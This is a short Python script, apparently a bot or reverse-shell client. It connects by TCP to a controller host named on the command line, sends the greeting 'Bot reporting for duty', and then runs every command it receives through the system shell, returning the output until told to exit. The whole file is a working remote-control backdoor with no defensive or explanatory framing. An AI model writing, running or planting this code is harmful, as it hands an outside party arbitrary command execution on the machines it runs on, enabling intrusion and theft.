import sys
from subprocess import Popen, PIPE
from socket import *

serverName = sys.argv[1]
serverPort = 8000

# Create IPv4(AF_INET), TCP Socket(SOCK_STREAM)
clientSocket = socket(AF_INET, SOCK_STREAM)
clientSocket.connect((serverName, serverPort))

# Optional: Send handshake message
clientSocket.send('Bot reporting for duty'.encode())

# Receive first command
command = clientSocket.recv(4064).decode()

while command != "exit":
    proc = Popen(command, stdout=PIPE, stderr=PIPE, shell=True)
    result, err = proc.communicate()

    # Send command output or error
    output = result if result else err
    clientSocket.send(output)

    # Wait for next command
    command = clientSocket.recv(4064).decode()

clientSocket.close()
